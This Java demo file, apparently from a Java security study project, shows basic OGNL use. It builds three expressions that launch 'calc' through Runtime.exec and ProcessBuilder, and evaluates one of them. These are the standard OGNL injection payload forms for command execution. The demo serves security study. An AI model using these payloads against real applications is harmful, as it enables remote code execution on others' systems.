package com.pacemrc.javasec.expression.ognl;

import ognl.Ognl;
import ognl.OgnlContext;
import ognl.OgnlException;

/**
 * OGNL的基本使用
 */
public class demo1 {
    public static void main(String[] args) throws OgnlException {

        //调用静态方法
        OgnlContext context1 = new OgnlContext();
        String expression1 = "@java.lang.Runtime@getRuntime().exec(\"calc\")";
//        Ognl.getValue(expression1,context1);

        //定义变量、传参、方法调用
        OgnlContext context2 = new OgnlContext();
        String expression2 = "#cmd='calc'," + "@java.lang.Runtime@getRuntime().exec(#cmd)";
//        Ognl.getValue(expression2,context2);

        //new关键字创建对象
        OgnlContext context3 = new OgnlContext();
        String expression3 = "(new java.lang.ProcessBuilder(new java.lang.String[]{'calc'})).start()";
        Ognl.getValue(expression3,context3);
    }
}
